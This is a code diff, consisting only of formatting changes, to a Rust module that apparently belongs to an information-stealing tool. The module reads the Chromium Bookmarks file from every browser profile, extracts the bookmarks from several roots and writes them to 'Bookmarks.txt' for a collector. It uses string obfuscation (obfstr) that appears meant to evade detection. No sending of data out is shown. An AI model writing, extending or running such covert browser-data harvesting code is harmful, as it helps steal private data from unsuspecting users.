@@ -1,17 +1,17 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::BrowserData;
-use crate::{collect_from_all_profiles, to_string_and_write_all, Bookmark};
+use crate::{Bookmark, collect_from_all_profiles, to_string_and_write_all};
 use alloc::sync::Arc;
 use alloc::vec;
 use alloc::vec::Vec;
 use collector::{Browser, Collector};
-use json::{parse, Value};
+use json::{Value, parse};
 use obfstr::obfstr as s;
-use tasks::{parent_name, Task};
+use tasks::{Task, parent_name};
 use utils::path::Path;
 
 pub(super) struct BookmarksTask {
-    browser: Arc<BrowserData>
+    browser: Arc<BrowserData>,
 }
 
 impl BookmarksTask {
@@ -24,11 +24,14 @@ impl<C: Collector> Task<C> for BookmarksTask {
     parent_name!("Bookmarks.txt");
 
     fn run(&self, parent: &Path, collector: &C) {
-        let Some(bookmarks) = collect_from_all_profiles(&self.browser.profiles, read_bookmarks) else {
-            return
+        let Some(bookmarks) = collect_from_all_profiles(&self.browser.profiles, read_bookmarks)
+        else {
+            return;
         };
 
-        collector.get_browser().increase_bookmarks_by(bookmarks.len());
+        collector
+            .get_browser()
+            .increase_bookmarks_by(bookmarks.len());
         let _ = to_string_and_write_all(&bookmarks, "\n\n", parent);
     }
 }
@@ -36,15 +39,15 @@ impl<C: Collector> Task<C> for BookmarksTask {
 fn read_bookmarks(profile: &Path) -> Option<Vec<Bookmark>> {
     let content = (profile / s!("Bookmarks")).read_file().ok()?;
     let json = parse(&content).ok()?;
-    
+
     let roots = json.get(s!("roots"))?;
-    
+
     let bookmarks: Vec<Bookmark> = [s!("bookmark_bar"), s!("other"), s!("synced")]
         .iter()
         .filter_map(|root| roots.get(root.as_ref()))
         .flat_map(extract_bookmarks)
         .collect();
-    
+
     Some(bookmarks)
 }
 
@@ -63,7 +66,6 @@ fn extract_bookmarks(root: &Value) -> Vec<Bookmark> {
                 });
             }
 
-
             if let Some(children_val) = obj.get("children")
                 && let Some(children) = children_val.as_array()
             {
@@ -74,5 +76,5 @@ fn extract_bookmarks(root: &Value) -> Vec<Bookmark> {
         }
     }
 
-    bookmarks 
+    bookmarks
 }
